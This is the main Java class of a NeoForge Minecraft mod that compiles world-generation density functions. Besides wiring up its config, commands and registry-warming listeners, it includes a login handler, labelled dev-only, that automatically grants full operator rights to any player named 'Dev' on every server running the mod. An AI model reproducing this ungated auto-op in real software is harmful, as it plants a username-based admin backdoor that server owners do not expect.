package dev.denismasterherobrine.densityfunctioncompiler;

import com.mojang.logging.LogUtils;
import dev.denismasterherobrine.densityfunctioncompiler.compiler.pipeline.RegistryWarmer;
import dev.denismasterherobrine.densityfunctioncompiler.config.DfcConfig;
import dev.denismasterherobrine.densityfunctioncompiler.compiler.vector.DfcVectorSupport;
import dev.denismasterherobrine.densityfunctioncompiler.debug.DfcCommand;
import net.neoforged.fml.config.ModConfig;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.players.PlayerList;
import net.neoforged.bus.api.IEventBus;
import net.neoforged.fml.ModContainer;
import net.neoforged.fml.common.Mod;
import net.neoforged.neoforge.common.NeoForge;
import net.neoforged.neoforge.event.OnDatapackSyncEvent;
import net.neoforged.neoforge.event.RegisterCommandsEvent;
import net.neoforged.neoforge.event.entity.player.PlayerEvent;
import net.neoforged.neoforge.event.server.ServerStartingEvent;
import org.slf4j.Logger;

@Mod(DensityFunctionCompiler.MODID)
public class DensityFunctionCompiler {
    public static final String MODID = "densityfunctioncompiler";
    public static final Logger LOGGER = LogUtils.getLogger();

    public DensityFunctionCompiler(IEventBus modBus, ModContainer container) {
        container.registerConfig(ModConfig.Type.COMMON, DfcConfig.COMMON_SPEC, MODID + "-common.toml");
        LOGGER.info("DensityFunctionCompiler initialising — runtime DF JIT pipeline enabling.");
        DfcVectorSupport.logStatusOnce();
        var bus = NeoForge.EVENT_BUS;
        bus.addListener(DensityFunctionCompiler::onRegisterCommands);
        bus.addListener(DensityFunctionCompiler::onServerStarting);
        bus.addListener(DensityFunctionCompiler::onDatapackSync);
        bus.addListener(DensityFunctionCompiler::onPlayerLoggedIn);
    }

    private static void onRegisterCommands(RegisterCommandsEvent event) {
        DfcCommand.register(event.getDispatcher());
    }

    private static void onServerStarting(ServerStartingEvent event) {
        RegistryWarmer.warmAll(event.getServer());
    }

    private static void onDatapackSync(OnDatapackSyncEvent event) {
        // Re-warm after every datapack reload — registries get rebuilt so the
        // identity-keyed visitor cache will need to compile the new instances.
        RegistryWarmer.warmAll(event.getPlayerList().getServer());
    }

    /**
     * Dev-only: grant operator (permission level 4) to a player named {@code Dev} on
     * join, so a local dedicated-server profile can use {@code /dfc} and other ops
     * without hand-editing {@code ops.json} before each JFR / profiling run.
     */
    private static void onPlayerLoggedIn(PlayerEvent.PlayerLoggedInEvent event) {
        if (!(event.getEntity() instanceof ServerPlayer sp)) {
            return;
        }
        if (!"Dev".equals(sp.getGameProfile().getName())) {
            return;
        }
        MinecraftServer server = sp.getServer();
        if (server == null) {
            return;
        }
        PlayerList list = server.getPlayerList();
        if (list.isOp(sp.getGameProfile())) {
            return;
        }
        list.op(sp.getGameProfile());
        LOGGER.info("DFC: auto-opped game profile \"Dev\" (dev profiling helper).");
    }
}
